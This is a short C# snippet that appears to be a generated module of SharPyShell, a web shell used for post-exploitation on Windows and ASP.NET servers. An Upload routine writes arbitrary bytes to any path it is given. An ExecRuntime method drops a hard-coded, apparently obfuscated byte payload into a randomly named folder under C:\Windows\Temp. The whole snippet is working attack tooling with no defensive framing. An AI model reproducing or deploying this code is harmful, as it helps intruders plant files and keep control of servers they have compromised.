
            using System;using System.IO;using System.Diagnostics;using System.Text;
            public class SharPyShell{                    
                byte[] Upload(string path, byte[] file_bytes){
                    byte[] upload_response=Encoding.UTF8.GetBytes("File uploaded correctly to: " + path);
                    try{
                        System.IO.File.WriteAllBytes(path, file_bytes);
                    }
                    catch (Exception e){
                        upload_response = Encoding.UTF8.GetBytes("{{{SharPyShellError}}}\n" + e);
                    }
                    return upload_response;
                }
                public byte[] ExecRuntime(){
                    byte[] file_bytes = {0x0f,0x2d,0x58,0x43,0x0d,0x0f,0x07,0x4c,0x34,0x43,0x51,0x45,0x03,0x43,0x53,0x73,0x45,0x57,0x0b,0x45,0x45,0x15,0x76,0x0c,0x14,0x54,0x57,0x12,0x42,0x2d,0x5c,0x47,0x4d} ;
                    byte[] output_func=Upload(@"C:\Windows\Temp\x1fvogijp5pyzn7\3186q1r3kpvk", file_bytes);
                    return(output_func);
                }
            }
    